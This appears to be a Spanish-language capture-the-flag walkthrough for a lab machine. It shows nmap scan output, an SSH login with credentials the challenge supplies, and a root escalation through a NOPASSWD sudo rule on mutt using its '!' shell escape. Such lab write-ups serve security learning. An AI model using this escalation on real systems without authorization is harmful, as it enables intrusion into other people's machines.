@@ -1,1 +1,109 @@
+//Escaneo y Reconocimiento de Puertos
+nmap -vv -sV -sC 10.0.160.162
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-17 11:59 -0600
+NSE: Loaded 158 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 11:59
+Completed NSE at 11:59, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 11:59
+Completed NSE at 11:59, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 11:59
+Completed NSE at 11:59, 0.00s elapsed
+Initiating Ping Scan at 11:59
+Scanning 10.0.160.162 [4 ports]
+Completed Ping Scan at 11:59, 0.20s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 11:59
+Completed Parallel DNS resolution of 1 host. at 11:59, 0.50s elapsed
+Initiating SYN Stealth Scan at 11:59
+Scanning 10.0.160.162 [1000 ports]
+Discovered open port 22/tcp on 10.0.160.162
+Discovered open port 80/tcp on 10.0.160.162
+Completed SYN Stealth Scan at 12:00, 18.35s elapsed (1000 total ports)
+Initiating Service scan at 12:00
+Scanning 2 services on 10.0.160.162
+Completed Service scan at 12:00, 6.42s elapsed (2 services on 1 host)
+NSE: Script scanning 10.0.160.162.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 12:00
+NSE Timing: About 99.65% done; ETC: 12:00 (0:00:00 remaining)
+Completed NSE at 12:00, 34.45s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 12:00
+Completed NSE at 12:00, 0.74s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 12:00
+Completed NSE at 12:00, 0.00s elapsed
+Nmap scan report for 10.0.160.162
+Host is up, received reset ttl 64 (0.17s latency).
+Scanned at 2026-09-17 11:59:47 CST for 60s
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 11:4a:37:6a:58:cb:08:26:8d:42:81:93:4e:19:6e:7a (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMLG7L5qc+AtO8U/mSOWOy1XiODXm9jOdJMa9mK53I80zcFbejRNcG/nLFNIfGGNHsLpH7IfU12hcQ3heKonsezyfMpPZFJi+6ZKHtG5h2rjzD2Yvo0AJZMEvs2lNRibNOk468K0PuwBryyEK0WeusUShpVJGwiumfhRzftDEdy5ff0kQEbHQgFJh3PCBHWqfoXTA/DVCxzblKHcdp4hzc5OQKqZI5cNl0EXS8ajfEOYBQJ3bzi2/eCzbGFADGhFoKd7/PVtYKx+ZpOSiRa2G84szXghj5OS68O4Qoke1FMWRAR0AOm80t9lE8qFEpre2+kavwr12NzCfR53vEVFxbVfKt/IBtEihiyH71uxVTCJOiZWrCTtGgGgWkLAsWxPPGBHh8toRsw4qqsRL3A5M+Q0kBf0Gm3nv2Ll1J6rZsYHtA7cpLko7fFpogajOhde7xGGNbENJObbbUMwLjPPx/jNg5Srjb3QUc2I0kpUeotdFaD22z1vhbmM+mrbW4HF0=
+|   256 4e:a3:0a:18:9f:c7:c8:cf:31:cd:a2:c1:5e:e2:2e:02 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO+YYMTyHUicGA0CE38KRD/xC4uqpbNZjgZ8ILjFXEAX
+80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+| http-methods: 
+|_  Supported Methods: GET
+|_http-favicon: Unknown favicon MD5: 9D18E671EB646D874CDBA24DC89A8AF1
+|_http-title:  brCTF 
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 12:00
+Completed NSE at 12:00, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 12:00
+Completed NSE at 12:00, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 12:00
+Completed NSE at 12:00, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 60.92 seconds
+           Raw packets sent: 1169 (51.412KB) | Rcvd: 1156 (46.248KB)
+
+
+//Credenciales de Aceeso
+Bueno nos dice en la pagina principal de la maquina que para simplificarnos la entrada nos va a dar las credenciales de acceso:
+
+user: anans3
+password: Kw3kuAnans3
+
+Ok ahora como vimos anteriormente tenemos el puerto 22 abierto (SSH) asi que nos conectaremos por SSH
+
+ssh anans3@10.0.160.162
+le escribimos yes
+y ponemos la contrasena
+
+// Escalacion de Privilegios
+Le hacemos un sudo -l para ver que privilegios tenemos o que podemos hacer:
+
+anans3@moderators:~$ sudo -l
+Matching Defaults entries for anans3 on moderators:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User anans3 may run the following commands on moderators:
+    (ALL : ALL) NOPASSWD: /usr/bin/mutt
+
+Bien ya sabemos que hacerno haremos un cat porque no tiene nada ese archivo asi vamos a hacer magia negra :v:
+anans3 puede ejecutar el comando `mutt` como cualquier usuario sin necesidad de contraseña, por lo que podemos dirigirnos al usuario root.
+
+Podemos ejecutarlo para obtener una nueva ventana interactiva.
+Asi que procedemos a escribir el siguiente comando para la shell interactiva:
+sudo /usr/bin/mutt
+
+Escribe `!` para realizar un *shell escape*, lo que permite invocar comandos en una subshell.
+
+Cuando se solicite el comando de shell, simplemente escribe `/bin/bash` o `/bin/sh` para obtener una shell interactiva como usuario *root*.
+
+Ubicaciones de las *flags*: `/root` y `/home/anans3`
+
 
